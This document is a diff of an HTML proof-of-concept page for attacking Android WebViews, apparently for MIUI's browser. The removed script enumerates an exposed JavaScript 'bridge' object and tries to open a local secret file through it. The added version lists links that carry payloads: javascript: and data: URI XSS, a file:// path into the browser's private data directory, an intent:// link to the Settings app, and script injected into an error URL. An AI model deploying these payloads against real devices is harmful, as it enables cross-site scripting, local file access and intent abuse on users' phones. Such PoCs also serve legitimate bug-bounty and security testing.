@@ -1,52 +1,15 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta charset="utf-8">
-  <title>WebView JSInterface PoC</title>
+  <title>MIUI WebView PoC</title>
 </head>
 <body>
-  <h1>🚨 WebView addJavascriptInterface PoC 🚨</h1>
-  <div id="output"></div>
+  <h2>🚀 MIUI WebView Scheme Injection Tester</h2>
 
-  <script>
-    function log(msg) {
-      document.getElementById("output").innerHTML += msg + "<br>";
-    }
-
-    try {
-      // cek apakah object "bridge" ada
-      if (typeof bridge !== "undefined") {
-        log("[+] Found JS Interface: bridge");
-
-        // dump semua property / method yang bisa diakses
-        for (var i in bridge) {
-          log(" -> " + i);
-        }
-
-        // coba manggil method umum (kalau ada)
-        try {
-          log("[+] Testing bridge.toString(): " + bridge.toString());
-        } catch (e) {
-          log("[-] Error calling toString(): " + e);
-        }
-
-        // contoh eksekusi method arbitrary kalau ada
-        // ganti 'openUrl' dengan nama method valid dari hasil dump
-        try {
-          if (typeof bridge.openUrl === "function") {
-            bridge.openUrl("file:///sdcard/Download/secret.txt");
-            log("[+] Called bridge.openUrl()");
-          }
-        } catch (e) {
-          log("[-] Error calling openUrl(): " + e);
-        }
-
-      } else {
-        log("[-] No 'bridge' object found.");
-      }
-    } catch (err) {
-      log("[-] Exception: " + err);
-    }
-  </script>
+  <p><a href="javascript:alert(document.domain)">[TEST] javascript: scheme</a></p>
+  <p><a href="file:///data/data/com.miui.browser/">[TEST] file:// scheme</a></p>
+  <p><a href="data:text/html,<script>alert('data-xss')</script>">[TEST] data: scheme</a></p>
+  <p><a href="intent://evil#Intent;scheme=http;package=com.android.settings;end">[TEST] intent:// scheme</a></p>
+  <p><a href="http://nonexistent.miui.com/404<script>alert('error')</script>">[TEST] custom error injection</a></p>
 </body>
 </html>
